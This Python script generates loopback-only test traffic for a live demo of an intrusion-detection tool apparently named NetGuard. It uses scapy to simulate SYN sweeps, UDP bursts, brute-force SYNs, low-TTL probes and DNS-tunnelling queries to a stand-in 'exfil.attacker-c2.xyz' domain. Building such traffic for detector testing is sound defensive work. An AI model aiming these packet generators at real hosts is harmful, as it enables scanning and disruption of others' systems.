"""Generate REAL loopback traffic so a live capture has something to see.

Unlike traffic.py (which only writes pcap files), this actually sends
packets over 127.0.0.1 so NetGuard's live capture has real traffic to
detect. Loopback only - nothing leaves the machine.

Used by run_live_demo.ps1 to produce a live, self-contained demo.
"""

from __future__ import annotations

import random
import sys
import threading
import time

from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, sendp, send  # type: ignore

random.seed(4242)

LOOPBACK = "127.0.0.1"


def _syn_flood(target_port: int = 80, n: int = 120, sport_base: int = 40000):
    """SYNs to a port nobody listens on -> unanswered -> scan detection."""
    for i in range(n):
        p = (IP(src=LOOPBACK, dst=LOOPBACK, ttl=64) /
             TCP(sport=sport_base + i, dport=target_port, flags="S",
                 seq=random.randint(1, 2**31)))
        send(p, verbose=False)
        time.sleep(0.002)


def _udp_burst(n: int = 150, dport: int = 33434):
    for _ in range(n):
        p = (IP(src=LOOPBACK, dst=LOOPBACK, ttl=52) /
             UDP(sport=random.randint(40000, 65000), dport=dport) /
             Raw(random.randbytes(48)))
        send(p, verbose=False)
        time.sleep(0.001)


def _dns_tunnel(n: int = 90):
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    for _ in range(n):
        label = "".join(random.choice(alphabet) for _ in range(52))
        q = f"{label}.exfil.attacker-c2.xyz"
        p = (IP(src=LOOPBACK, dst=LOOPBACK, ttl=64) /
             UDP(sport=random.randint(40000, 65000), dport=53) /
             DNS(rd=0, qd=DNSQR(qname=q)))
        send(p, verbose=False)
        time.sleep(0.002)


def _ttl_limping(n: int = 30):
    for i in range(n):
        p = (IP(src=LOOPBACK, dst=LOOPBACK, ttl=4) /
             TCP(sport=41000 + i, dport=9, flags="S", seq=1000 + i))
        send(p, verbose=False)
        time.sleep(0.002)


def _brute_force(n: int = 40, dport: int = 22):
    for i in range(n):
        sport = 42000 + i
        send(IP(src=LOOPBACK, dst=LOOPBACK, ttl=64) /
             TCP(sport=sport, dport=dport, flags="S", seq=random.randint(1, 2**31)),
             verbose=False)
        time.sleep(0.004)


def _benign_dns(names=("google.com", "github.com", "amazon.com",
                       "wikipedia.org", "stackoverflow.com")):
    for i, nm in enumerate(names):
        send(IP(src=LOOPBACK, dst=LOOPBACK, ttl=64) /
             UDP(sport=43000 + i, dport=53) / DNS(rd=0, qd=DNSQR(qname=nm)),
             verbose=False)
        time.sleep(0.01)


def main():
    duration = int(sys.argv[1]) if len(sys.argv) > 1 else 60
    print(f"[gen-live] generating loopback traffic for {duration}s", flush=True)
    end = time.time() + duration
    while time.time() < end:
        print("[gen-live] benign DNS", flush=True)
        _benign_dns()
        time.sleep(0.5)

        print("[gen-live] SYN sweep (unanswered)", flush=True)
        _syn_flood()
        time.sleep(0.3)

        print("[gen-live] UDP burst", flush=True)
        _udp_burst()
        time.sleep(0.3)

        print("[gen-live] DNS tunnel", flush=True)
        _dns_tunnel()
        time.sleep(0.3)

        print("[gen-live] TTL limping", flush=True)
        _ttl_limping()
        time.sleep(0.3)

        print("[gen-live] brute force attempts", flush=True)
        _brute_force()
        time.sleep(0.5)

    print("[gen-live] done", flush=True)


if __name__ == "__main__":
    main()
